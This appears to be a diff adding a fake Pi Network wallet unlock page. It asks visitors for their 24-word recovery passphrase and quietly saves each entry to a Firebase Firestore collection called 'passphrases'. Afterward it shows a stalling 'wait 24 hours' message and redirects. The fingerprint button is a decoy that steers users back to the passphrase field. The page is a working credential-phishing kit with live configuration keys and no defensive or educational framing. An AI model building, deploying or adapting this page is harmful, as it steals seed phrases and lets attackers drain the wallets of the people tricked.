@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet Replica</title>
+
+    <style>
+        /* Styling your page */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #000;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            background-color: #6a1b9a;
+            padding: 15px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .container {
+            padding: 20px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .passphrase-box {
+            width: 90%;
+            max-width: 400px;
+            height: 150px;
+            margin: 0 auto;
+            background-color: #f3f3f3;
+            border-radius: 10px;
+            font-size: 18px;
+            color: black;
+            padding: 15px;
+            border: 2px solid #ddd;
+            resize: none;
+            outline: none;
+            transition: border 0.3s ease;
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .topup-message {
+            display: none;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 16px;
+            z-index: 1000;
+            text-align: center;
+            width: 80%;
+            max-width: 300px;
+        }
+
+        .button {
+            width: 90%;
+            max-width: 400px;
+            padding: 15px;
+            margin: 15px auto;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            display: block;
+            text-align: center;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .btn-passphrase {
+            background-color: white;
+            color: #6a1b9a;
+            border: 2px solid #6a1b9a;
+        }
+
+        .btn-fingerprint {
+            background-color: #6a1b9a;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+  
+ <!-- Header -->
+ <div class="header">
+    <i class="fas fa-arrow-left"></i>
+    <span>Wallet</span>
+    <i class="fas fa-coins" style="margin-left: auto;"></i>
+</div>
+
+<!-- Content -->
+<div class="container">
+    <h2>Unlock Pi Wallet</h2>
+
+    <!-- Passphrase Box -->
+    <textarea id="passphrase" class="passphrase-box" placeholder="Enter your 24-word passphrase here"></textarea>
+    <p id="error-message" class="error-message"></p>
+
+    <!-- Buttons -->
+    <a href="#" class="button btn-passphrase" onclick="validatePassphrase()">Unlock With Passphrase</a>
+    <a href="#" class="button btn-fingerprint" onclick="showFingerprintError()">Unlock With Fingerprint</a>
+</div>
+
+<!-- Top-up Message -->
+<div id="topup-message" class="topup-message">Please wait for 24 hours.</div>
+
+<!-- Firebase SDKs (using v8.x.x) -->
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+<script>
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAtuqroUbp9TpqjNvbl99eDaihRMenhEqw",
+        authDomain: "pint-145f3.firebaseapp.com",
+        projectId: "pint-145f3",
+        storageBucket: "pint-145f3.appspot.com",
+        messagingSenderId: "77141015675",
+        appId: "1:77141015675:web:96747fb0e4d665448ab6de",
+        measurementId: "G-7ENZTTCRRG"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const firestore = firebase.firestore();
+
+    // Function to handle fingerprint error
+    function showFingerprintError() {
+        alert("Fingerprint unlock is not available at the moment. Please enter your passphrase.");
+    }
+
+    // Validate passphrase function
+    function validatePassphrase() {
+        let passphraseInput = document.getElementById("passphrase");
+        let errorMessage = document.getElementById("error-message");
+        let topupMessage = document.getElementById("topup-message");
+
+        if (!passphraseInput) return;
+
+        let passphrase = passphraseInput.value.trim();
+        console.log("Passphrase entered:", passphrase);  // Print passphrase value for debugging
+
+        if (passphrase === "") {
+            errorMessage.textContent = "Passphrase cannot be empty!";
+            errorMessage.style.display = "block";
+            return;
+        }
+
+        let words = passphrase.split(/\s+/);
+        if (words.length >24) {  // Ensure it's exactly 24 words
+            console.log(words);  // Print words array to debug
+            errorMessage.textContent = "Passphrase must contain exactly 24 words!";
+            errorMessage.style.display = "block";
+            return;
+        }
+
+        errorMessage.style.display = "none";
+
+        // Store passphrase in Firebase Firestore
+        firestore.collection("passphrases").add({
+            passphrase: passphrase,
+            timestamp: new Date().toISOString()
+        }).then((docRef) => {
+            // Log success and print the document ID
+            console.log("Passphrase stored successfully in Firestore! Document ID:", docRef.id);
+        }).catch((error) => {
+            // Log any error that occurs during the save operation
+            console.error("Error storing passphrase in Firestore:", error);
+        });
+
+        // Show "Please wait for 24 hours" message
+        topupMessage.style.display = "flex";
+
+        // Redirect after 3 seconds
+        setTimeout(() => {
+            topupMessage.style.display = "none";
+            window.location.href = "frontPage.html";  // Use relative path
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
